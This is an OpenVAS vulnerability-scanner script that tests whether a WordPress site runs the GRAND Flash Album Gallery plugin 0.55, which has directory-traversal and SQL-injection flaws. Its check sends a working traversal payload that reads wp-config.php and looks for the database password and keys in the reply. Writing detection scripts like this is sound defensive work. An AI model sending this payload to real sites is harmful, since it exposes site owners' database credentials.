###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to read arbitrary files via
  directory traversal attacks and gain sensitive information via SQL Injection
  attack.
  Impact Level: Application";
tag_affected = "WordPress GRAND Flash Album Gallery Version 0.55.";
tag_insight = "The flaws are due to
  - input validation error in 'want2Read' parameter to 'wp-content/plugins/
    flash-album-gallery/admin/news.php', which allows attackers to read
    arbitrary files via a ../(dot dot) sequences.
  - improper validation of user-supplied input via the 'pid' parameter to
    'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
    attackers to manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 12th April, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/flash-album-gallery/";
tag_summary = "This host is installed with WordPress GRAND Flash Album Gallery Plugin and
  is prone to multiple vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802015";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/71072");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/71073");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43648/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16947/");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in WordPress GRAND FIA Gallery Plugin");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Post Data
postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";

## Construct attack post request
req = string("POST ", path, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
             "User-Agent: GRAND FIA Gallery Dir Trav Test\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData),
             "\r\n\r\n", postData);

## Send post request and Receive the response
res = http_send_recv(port:port, data:req);

## Check for patterns present in wp-config.php file in the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) && "DB_NAME" ><
   res && "DB_USER" >< res && "DB_PASSWORD" >< res && "AUTH_KEY" >< res)
{
  security_hole(port);
}
